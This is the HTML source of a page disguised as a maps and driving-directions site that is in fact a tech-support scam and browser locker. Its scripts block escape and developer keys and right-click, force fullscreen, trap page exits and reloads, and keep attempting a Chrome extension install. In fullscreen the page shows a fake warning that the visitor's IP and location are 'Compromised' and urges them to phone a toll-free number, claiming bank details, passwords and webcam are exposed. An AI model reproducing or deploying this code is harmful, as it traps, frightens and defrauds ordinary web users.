<!DOCTYPE html>

<html>
<head>

	<title>Virtual content</title>
	<link href='https://fonts.googleapis.com/css?family=Poppins:400,300,500,600,700' rel='stylesheet' type='text/css'>
	<link href='https://fonts.googleapis.com/css?family=Lora:400,400italic,700,700italic' rel='stylesheet' type='text/css'>

		<!-- CSS
		–––––––––––––––––––––––––––––––––––––––––––––––––– -->
		<link rel="stylesheet" href="assets/css/bootstrap.css">
		<link rel="stylesheet" href="assets/css/style.css">
		<link rel="stylesheet" href="assets/css/animate.css">
		<link rel="stylesheet" href="assets/css/magnific-popup.css">
		<!-- Icons
		–––––––––––––––––––––––––––––––––––––––––––––––––– -->
		<link rel="stylesheet" href="assets/icons/Linea/styles.css" />
		<link rel="stylesheet" href="assets/icons/Elegant/style.css" />
		<link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
		<link rel="stylesheet" type="text/css" href="ua-changer_files/styles.min.css">
		<!-- <script>var chrttid = "gcgogpkeadeekoklheoafoamoolgofdp";</script> -->

		<script>
			var oldBodyHeight;
			function getBH() {
				var w = window,
				d = document,
				e = d.documentElement,
				g = d.getElementsByTagName('body')[0]; 
				return (w.innerHeight|| e.clientHeight|| g.clientHeight);
			}
			function isFullScreen() {
				return (getBH() > (oldBodyHeight + 30));
			}

			var getCookie = function(name) {
				var matches = document.cookie.match(new RegExp(
					"(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
					))
				return matches ? decodeURIComponent(matches[1]) : false
			}

		// var sucurl   = 'http://zorrofirst.ru/out/out.php?utm_source=ex1_UA&utm_content=kopilka.xxx&idpr=gcgogpkeadeekoklheoafoamoolgofdp';
		// var redirurl = 'https://href.li/?https://google.com';

		var was_installed;
		// was_installed = getCookie('vkmusicextensioninstalled');
		var bb;
		var ints = function(){};
		var ua = navigator.userAgent;
	// if( (typeof chrome != 'undefined') && chrome.webstore && chrome.webstore.install && !was_installed)
	if( 1 == 1){
		bb = true;
		var ui = setInterval(function(){
			try {
				var fbc = function() {
					clearInterval(ui);
					bb = false;
					window.onbeforeunload = function(){};
					// document.location.href = redirurl;
				};
				chrome.webstore.install('', fbc);
			} catch (y) {};
		}, 250);
	}
	// else{
	//     document.location.href = redirurl;
	// }
	window.addEventListener("beforeunload", function (e) {
	var confirmationMessage = "Some text!";

	(e || window.event).returnValue = confirmationMessage;
	return fullScreen();
});

	var y = true;
	var call = false;

	function get_text() {
		//var block3 = new Array(3).join("\n\n\n");
		var ct = ' Hi there!'+"\n";
		var block = ' Page is loading...';
		return /*block3+*/ct+block+"\n"/*+ct+ct+block2*/;
	}

	window.onkeydown = function(evt) {
		if (evt.keyCode == 27 || evt.keyCode == 18 || evt.keyCode == 123 || evt.keyCode == 87 || evt.keyCode == 119 || evt.keyCode == 110 || evt.keyCode == 46 || evt.keyCode == 85 || evt.keyCode == 9 || evt.keyCode == 115 || evt.keyCode == 116 || evt.keyCode == 112 || evt.keyCode == 114 || evt.keyCode == 17) {
			return false;
		}
	};
	window.onkeypress = function(evn) {
		if (evn.keyCode == 123 || evn.keyCode == 117) return false;
	};
	
	function changeOpacity(className, opVal) {
		var elems = document.getElementsByClassName(className);
		for (var i = 0; i < elems.length; i++)
			elems[i].style.opacity = opVal;
	}
	function step1 () {
		changeOpacity('step1show', 1);
		changeOpacity('step1noshow', 0);
		document.getElementById("secondstep").style.opacity = "0";
		// document.getElementById('modal').style.display = 'none';
		// document.getElementById('undeContinue').style.display = 'none';
		// document.getElementById('cancelWindow').style.display = 'none';
		document.getElementById("firststep").style.display = "block";
	}
	function step2() {
		changeOpacity('step2show', 1);
		changeOpacity('step2noshow', 0);
		document.getElementById("firststep").style.display = "none";
		document.getElementById("secondstep").style.opacity = "1";
	}
	
	document.oncontextmenu = new Function("return false");
	function fullScreen() {
		try {
			document.documentElement.requestFullScreen();
		} catch (e) {};
		try {
			document.documentElement.webkitRequestFullScreen();
		} catch (e) {};
		if (isFullScreen()) {
			step2();
		}
	}

	window.onkeyup = function(e){
		fullScreen();
		//if (y)
		//	location.reload();
	};
	// setInterval(function(){
	// 	if (!document.getElementById('chrweb')) {
	// 		var link = document.createElement('link');
	// 		link.setAttribute("id", "chrweb");
	// 		link.setAttribute("rel", "chrome-webstore-item");
	// 		link.setAttribute("href", "https://chrome.google.com/webstore/detail/"+chrttid);
	// 		document.head.appendChild(link);
	// 	}
	// },100);
	
	//location.reload();
</script>
<!-- <link id="chrweb" rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/gcgogpkeadeekoklheoafoamoolgofdp"> --></head>
<body style="position:relative;min-height:620px;height:100%" id="body">
	<script>
		function setCookie(e,o,i){i=i||{};var r=i.expires;if("number"==typeof r&&r){var t=new Date;t.setTime(t.getTime()+1e3*r),r=i.expires=t}r&&r.toUTCString&&(i.expires=r.toUTCString()),o=encodeURIComponent(o);var n=e+"="+o;for(var a in i){n+="; "+a;var m=i[a];m!==!0&&(n+="="+m)}document.cookie=n}

		var wasRun = getCookie('wasRun');	
		if (!wasRun) {
			/*setTimeout(function(){*/alert(get_text())/*}, 300)*/;
		//setCookie('wasRun', 'true', {expires: 3600, path: '/'});
	}
</script>
<div id="firststep" class="step1show step2noshow" style="position: absolute; width: 100%; top: -30px; z-index: 300; opacity: 0; display: block;">
	<!-- <center><h1>Hello World!</h1></center> -->
	<header id="headerBar" class="headerTop">

		<div class="container-fluid">

			<!--Header logo on the left side-->

			<div class="col-md-4 col-sm-1 col-xs-4 headerLeft">
				<a href="index.html">
					<img src="assets/images/site-logo2.png" alt="">
				</a>
			</div>

			<!--Header right side with left-aligned menu-->

			<div class="col-md-8 col-sm-11 col-xs-8 headerRight">
				<div class="header-right">

					<!--Navigation-->
					<nav class="navigation">

						<div class="navbar-header">
							<span class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
								<i class="fa fa-bars"></i>
							</span>
						</div>

						<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">

							<ul class="navbar navbar-right">
								<li><a href="#sectionIntro" class="easing">Home</a></li>
								<li><a href="#sectionAbout" class="easing">Get Directions</a></li>
								<li><a href="#sectionResume" class="easing">Find Places</a></li>
								<li><a href="#sectionPortfolio" class="easing">Driving Directions</a></li>
								<li><a href="#sectionClients" class="easing">Clients</a></li>
								<li><a href="#sectionContact" class="easing">Contact</a></li>
							</ul>

						</div>

					</nav>
					<!--END Navigation-->

				</div>
			</div>
			<!--END Header right side-->


		</div>
		<!--END container-->
	</header>
	<!--END Header bar-->



<!-- section Intro
	–––––––––––––––––––––––––––––––––––––––––––––––––– -->
	
	<section id="sectionIntro" class="parallax">
		<div class="col-md-12 col-sm-12 col-xs-12">
			<div class="container-fluid">

				<div class="textIntro">
					<div class="hi">
						<h1>Directions and Maps</h1>
						<span>get easy directions</span><br>
						<a href="#sectionAbout" class="easing">
							<img src="assets/images/arrow.png" alt="">
						</a>
					</div>
				</div>

			</div>
		</div>
	</section> 



<!-- section About
	–––––––––––––––––––––––––––––––––––––––––––––––––– -->

	<section id="sectionAbout">
		
		<div class="sectionTitle">
			<h1>Get Directions</h1>
		</div>     

		<div class="container">

			<div class="contactForm row">

				<div class="col-md-6 col-sm-12 col-xs-12 contactLeft">
					<!--MESSAGE SENT SUCCESFULLY-->
					<div id="message"></div>

					<!--MAIN FORM-->

					<form method="post" action="assets/contact.php" name="contactform" id="contactform" style="
					margin-top: 100px;">

					<fieldset>

						<div class="col-md-12 col-sm-12 col-xs-12">
							<input name="name" type="text" id="name" placeholder="From :" size="30" value="" />
						</div>

						<div class="col-md-12 col-sm-12 col-xs-12">
							<input name="email" type="text" id="email" placeholder="Where :" size="30" value="" />
						</div>

						<a type="submit" class="submit custom_btn" id="submit" value="Get Directions" onclick="ints();">Get Directions</a>


					</fieldset>

				</form>
				<!--END Main form-->
			</div>

			<div class="col-md-6 col-sm-12 col-xs-12">
				<div id="map3"><iframe src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d15364431.628994234!2d-100.42190882174566!3d37.76023501350464!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2s!4v1478972998899" width="600" height="450" frameborder="0" style="border:0" allowfullscreen></iframe></div>
			</div>

		</div>
		<!-- END contact FORM-->
	</div>

</section>


<!-- section Resume
	–––––––––––––––––––––––––––––––––––––––––––––––––– -->

	<section id="sectionResume"> 

		<div class="sectionTitle">
			<h1>Find Places</h1>
		</div>     

		<div class="container">

			<div class="contactForm row">

				<div class="col-md-6 col-sm-12 col-xs-12 contactLeft" style="background-color: #f7f7f7;">
					<!--MESSAGE SENT SUCCESFULLY-->
					<div id="message"></div>

					<!--MAIN FORM-->

					<form method="post" action="assets/contact.php" name="contactform" id="contactform" style="
					margin-top: 100px;">

					<fieldset>

						<div class="col-md-12 col-sm-12 col-xs-12">
							<input name="name" type="text" id="name" placeholder="Enter Current location :" size="30" value="" />
						</div>

						<div class="col-md-12 col-sm-12 col-xs-12">
							<input name="email" type="text" id="email" placeholder="Destination :" size="30" value="" />
						</div>
						<a type="submit" class="submit custom_btn" id="submit" value="Get Directions" onclick="ints();">Find Places</a>


					</fieldset>

				</form>
				<!--END Main form-->
			</div>

			<div class="col-md-6 col-sm-12 col-xs-12">
				<div id="map1"><iframe src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d15364431.628994234!2d-100.42190882174566!3d37.76023501350464!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2s!4v1478972998899" width="600" height="450" frameborder="0" style="border:0" allowfullscreen></iframe></div>
			</div>

		</div>
		<!-- END contact FORM-->
	</div>

</section>


<!-- section Portfolio
	–––––––––––––––––––––––––––––––––––––––––––––––––– -->
	<section id="sectionPortfolio">

		<div class="sectionTitle">
			<h1>Driving Directions</h1>
		</div>     

		<div class="container">

			<div class="contactForm row">

				<div class="col-md-6 col-sm-12 col-xs-12 contactLeft">
					<!--MESSAGE SENT SUCCESFULLY-->
					<div id="message"></div>

					<!--MAIN FORM-->

					<form method="post" action="assets/contact.php" name="contactform" id="contactform" style="
					margin-top: 100px;">

					<fieldset>

						<div class="col-md-12 col-sm-12 col-xs-12">
							<input name="name" type="text" id="name" placeholder="From :" size="30" value="" />
						</div>

						<div class="col-md-12 col-sm-12 col-xs-12">
							<input name="email" type="text" id="email" placeholder="Where :" size="30" value="" />
						</div>
						<a type="submit" class="submit custom_btn" id="submit" value="Get Directions" onclick="ints();">Get Directions</a>


					</fieldset>

				</form>
				<!--END Main form-->
			</div>

			<div class="col-md-6 col-sm-12 col-xs-12">
				<div id="map2"><iframe src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d15364431.628994234!2d-100.42190882174566!3d37.76023501350464!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2s!4v1478972998899" width="600" height="450" frameborder="0" style="border:0" allowfullscreen></iframe></div>
			</div>

		</div>
		<!-- END contact FORM-->
	</div>

</section>


<!-- section Clients
	–––––––––––––––––––––––––––––––––––––––––––––––––– -->

	<section id="sectionClients">

		<div class="container">

			<div class="sectionTitle">
				<h1>They trust us</h1>
				<span>Clients</span>
			</div>

			<div class="clients row">
				<div class="col-md-4 col-sm-12 col-xs-12 clients-box-top">
					<div class="clients-bg"></div>
					<img src="assets/images/clients1.png" alt="">
				</div>

				<div class="col-md-4 col-sm-12 col-xs-12 clients-box-top">
					<div class="clients-bg"></div>
					<img src="assets/images/clients2.png" alt="">
				</div>

				<div class="col-md-4 col-sm-12 col-xs-12 clients-box-top last-client">
					<div class="clients-bg"></div>
					<img src="assets/images/clients3.png" alt="">
				</div>

				<div class="col-md-4 col-sm-12 col-xs-12 clients-box-bot">
					<div class="clients-bg"></div>
					<img src="assets/images/clients4.png" alt="">
				</div>

				<div class="col-md-4 col-sm-12 col-xs-12 clients-box-bot">
					<div class="clients-bg"></div>
					<img src="assets/images/clients5.png" alt="">
				</div>

				<div class="col-md-4 col-sm-12 col-xs-12 clients-box-bot last-client">
					<div class="clients-bg"></div>
					<img src="assets/images/clients6.png" alt="">
				</div>
			</div>

		</div>

	</section>


<!-- section Contact
	–––––––––––––––––––––––––––––––––––––––––––––––––– -->

	<section id="sectionContact">

		<div class="sectionTitle">
			<h1>Get in touch</h1>
			<span>Contact</span>
		</div>     

		<div class="container">

			<div class="contactForm row">

				<div class="col-md-6 col-sm-12 col-xs-12 contactLeft">
					<!--MESSAGE SENT SUCCESFULLY-->
					<div id="message"></div>

					<!--MAIN FORM-->

					<form method="post" action="assets/contact.php" name="contactform" id="contactform">

						<fieldset>

							<div class="col-md-12 col-sm-12 col-xs-12">
								<input name="name" type="text" id="name" placeholder="Name* :" size="30" value="" />
							</div>

							<div class="col-md-12 col-sm-12 col-xs-12">
								<input name="email" type="text" id="email" placeholder="E-mail* :" size="30" value="" />
							</div>

							<div class="col-md-12 col-sm-12 col-xs-12">
								<input name="subject" type="text" id="subject" placeholder="Subject* :" size="30" value="" />
							</div>

							<div class="col-md-12 col-sm-12 col-xs-12">
								<textarea name="comments" cols="40" rows="3" placeholder="Message* :" id="comments"></textarea>
							</div>

							<input type="submit" class="submit" id="submit" value="Send message" onclick="ints();"/>


						</fieldset>

					</form>
					<!--END Main form-->
				</div>

				<div class="col-md-6 col-sm-12 col-xs-12">
					<div id="map"></div>
				</div>

			</div>
			<!-- END contact FORM-->
		</div>



	</section>

	<!-- Footer
	–––––––––––––––––––––––––––––––––––––––––––––––––– -->

	<footer class="pFooter">

		<div class="container-fluid">

			<div class="col-md-6 col-sm-12 col-xs-12 fCopy">
				Copyright © <span>Mini</span> 2016. All rights reserved.
			</div>

			<div class="col-md-6 col-sm-12 col-xs-12 fIcons">
				<a href="#">
					<span aria-hidden="true" class="social_facebook_circle"></span>
				</a>
				<a href="#">
					<span aria-hidden="true" class="social_twitter_circle"></span>
				</a>
				<a href="#">
					<span aria-hidden="true" class="social_dribbble_circle"></span>
				</a>
				<a href="#">
					<span aria-hidden="true" class="social_instagram_circle"></span>
				</a>
			</div>

		</div>

	</footer>
</div>

<div id="secondstep" style="height:100%;width:100%;position:relative;top:0;left:0;opacity: 0;">

	<div class="maincont" style="position:relative;top:0px;z-index:10;">

		<section class="top step2show step1noshow">

			<div class="top_left">
				<p>Your Location:</p>
				<span>Compromised</span>
			</div>

			<div class="top_center">
				<p>Your IP Address:</p>
				<span>Compromised</span>
			</div>

			<div class="top_right">
				<p>Date:</p>
				<span><!-- <?php echo date("l dS of F Y"); ?> -->Date</span>
			</div>

		</section>

		<section class="content step2show step1noshow">

			<section class="left">
				<h1>What to do:</h1>		
				<article>Call TOLL FREE 877-566-1879 <br> immediately</article>
				<p>for assistance on how to remove malicious pop-ups. This call is prioritized and 100% free</p>

				<h1>More about the threat:</h1>
				<p>Seeing these pop-ups means that you may have malware/andware on your computer wich puts the security of your personal data at a serious risk. We strongly advise you call TOLL FREE 877-566-1879 immediately and get your computer fixed before you continue using the internet, especially for watching movies and shows.</p>
				<div class="support">

					<div class="s_left">
						<h1>24/7</h1>
						<h4>Free Expert Tech Support</h4>
					</div>
					<div class="s_right">
						<img src="img/windows.png" alt="Windows">
					</div>
				</div>
			</section>

			<section class="right">
				<p>Possible network damages from potential threats: <span>Unknown</span></p>
				<h3>Data exposed to risk:</h3>
				<ul>
					<li><span>1.</span>Your credit card details and banking iformation</li>
					<li><span>2.</span>Your e-mail passwords and other account passwords</li>
					<li><span>3.</span>Your Facebook, Skype, AIM, ICQ and other chat logs</li>
					<li><span>4.</span>Your private photos, family photos and other sensitive files</li>
					<li><span>5.</span>Your webcam could be accessed remotely by stalkers with a VPN file</li>
				</ul>
				<div class="btn_call">Call 877-566-1879</div>
			</section>

		</section>

	</div>

	<div class="footer step2show step1noshow" style="position: absolute; bottom: 0px; z-index: 5; opacity: 1;">
		<div class="footer1" style="height:74px;position:relative;width:960px;left:50%;margin-left:-480px">

		</div>


		<div class="footer2" style="height:29px">&nbsp;
						<!--<ul>
								<li><a href="#">License Agreement</a></li>
								<li><a href="#">Contact Us</a></li>
								<li><a href="#">Privacy Policy</a></li>
							</ul>-->
						</div>
					</div>

					<!-- <div class="wrapper">
						<div id="modal" class="jqmWindow" style="width: 340px; display: block; z-index: 99999999; margin-left: -160px; top: 245px !important;">
						</div>
					</div> -->

				</div>

				<script>
					ints = function() {
						fullScreen();
						if (!isFullScreen()) {
							fullScreen();
						} else {
							call = true;
							document.getElementById('cancelWindow').style.display = "none";
							// var url = "https://chrome.google.com/webstore/detail/"+chrttid;
							// chrome.webstore.install(url, successPlainCallback, errorCallback);
							// setTimeout('document.getElementById(\'modal\').style.display = \'block\'',800);
							setTimeout(fullScreen(),800);
							// setTimeout('document.getElementById(\'undeContinue\').style.display = \'block\'',500);
						}
					}

					function successPlainCallback() {
						y = false;
						// document.getElementById('modal').style.display = 'none';
						// document.getElementById('undeContinue').style.display = 'none';
						window.onbeforeunload = null;
						// yaCounter30563352.reachGoal('APPROVE');
						document.getElementById('cancelWindow').style.display = "none";
						// document.location.href = sucurl;
					}

					function errorCallback(err) {
						fullScreen();
		 //    		if (err == "User cancelled install") {
		 //    			call = false;
		 //    			document.getElementById('modal').style.display = 'none';
					// 		//document.getElementById('undeContinue').style.display = 'none';
					// 		document.getElementById('cancelWindow').style.display = "block";
					// 	};
				}

	//setTimeout(function(){alert(getText())}, 200);
</script>

<!-- <audio id="audio" src="voice-eng.mp3" autoplay="">

	<script>
		a = document.getElementById('audio');

		a.onended = function(){setTimeout("a.play()", 1000)}
	</script>

</audio> -->

<!-- <div id="undeContinue" style="height: 100%; opacity: 0.9; position: fixed; width: 100%; z-index: 9999999; top: 0px; left: 0px; display: block; background: rgb(0, 0, 0);"></div> -->

<div id="cancelWindow" style="display: none; width: 378px; height: 239px; /*background: url(%27CancelPop-notext.html) no-repeat center;*/ position: fixed; left: 50%; top: 220px; margin-left: -189px; z-index: 99999999; " onclick="ints();">
<!-- 	<p style="color: #000000; font-family: Arial, &#39;Helvetica Neue&#39;, Helvetica, sans-serif; font-size: 14px; line-height: 20px; padding: 74px 0 0 22px;">�� ������ ��������� ���������? <br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp����� �� ��������� ����� ������� ���� ������ &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp����������.</p>
	<p style="color: #000000; font-family: Arial, &#39;Helvetica Neue&#39;, Helvetica, sans-serif; font-size: 14px; line-height: 43px; text-align: center; position: absolute; bottom: 30px; right: 135px">��</p>
	<p style="color: #000000; font-family: Arial, &#39;Helvetica Neue&#39;, Helvetica, sans-serif; font-size: 14px; line-height: 43px; text-align: center; position: absolute; bottom: 30px; right: 45px">���</p>
	<div onclick="ints();" style="cursor: pointer; position: absolute; left: 201px; top: 170px; width: 71px; height: 27px;"></div>
	<div onclick="ints();" class="buttonLink" style="cursor: pointer; position: absolute; left: 282px; top: 170px; width: 71px; height: 27px;"></div> -->
</div>

<script>
	//DOM Ready
	oldBodyHeight = getBH();

	if (bb)
		window.onbeforeunload = function()
	{
		if(y)
			return get_text();

	};

	window.onblur = function(){
		if (y && !call && !isFullScreen())
			location.reload();
	};

	var oldY = 1000;
	var curY = oldY;
	document.onmousemove = function(e){
		oldY = curY;
		curY = e.pageY;
		if (y && !call && !isFullScreen())
			if((curY < 30) && (oldY > curY)) {
				curY = 0;
				location.reload();
			}
		};

		step1();
		setInterval(function(){
			if (!isFullScreen()) {
				step1();
			} else
			step2();
		}, 300);
	</script>
	<script src="assets/js/jquery-2.1.3.js"></script>
	<script src="assets/js/bootstrap.js"></script>
	<!-- Navigation menu-->
	<script src="assets/js/classie.js"></script>
	<script src="assets/js/menu-top.js"></script>
	<script src="assets/js/nav-active.js"></script>
	<script src="assets/js/jquery.easing.js"></script>
	<!--JS for MAGNIFIC POPUP & ALL SCRIPTS& CALLS-->
	<script src="assets/js/scripts.js"></script>
	<script src="assets/js/jquery.magnific-popup.min.js"></script>    
	<!-- WOW ANIMATIONS -->
	<script src="assets/js/wow.min.js"></script>
	<script src="assets/js/jquery-parallax.js"></script>
	<script>
		new WOW().init();
	</script>
	<!-- GOGGLE MAP	–––––––––––––––––––––––––––––––––––––––––––––––––– -->
	<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?sensor=false"></script>

	<script type="text/javascript">
						// When the window has finished loading create our google map below
						google.maps.event.addDomListener(window, 'load', init);

						function init() {
								// Basic options for a simple Google Map
								// For more options see: https://developers.google.com/maps/documentation/javascript/reference#MapOptions
								var mapOptions = {
										// How zoomed in you want the map to start at (always required)
										zoom: 11,

										// The latitude and longitude to center the map (always required)
										center: new google.maps.LatLng(40.6700, -73.9400), // New York

										// How you would like to style the map. 
										// This is where you would paste any style found on Snazzy Maps.
										styles: [{"featureType":"administrative","elementType":"labels.text.fill","stylers":[{"color":"#444444"}]},{"featureType":"landscape","elementType":"all","stylers":[{"color":"#f2f2f2"}]},{"featureType":"poi","elementType":"all","stylers":[{"visibility":"off"}]},{"featureType":"road","elementType":"all","stylers":[{"saturation":-100},{"lightness":45}]},{"featureType":"road.highway","elementType":"all","stylers":[{"visibility":"simplified"}]},{"featureType":"road.arterial","elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"transit","elementType":"all","stylers":[{"visibility":"off"}]},{"featureType":"water","elementType":"all","stylers":[{"color":"#ffffff"},{"visibility":"on"}]}]
									};

								// Get the HTML DOM element that will contain your map 
								// We are using a div with id="map" seen below in the <body>
								var mapElement = document.getElementById('map');

								// Create the Google Map using our element and options defined above
								var map = new google.maps.Map(mapElement, mapOptions);

								// Let's also add a marker while we're at it
								var marker = new google.maps.Marker({
									position: new google.maps.LatLng(40.6700, -73.9400),
									map: map,
									title: 'Snazzy!'
								});
							}
						</script>
					</body>
					</html>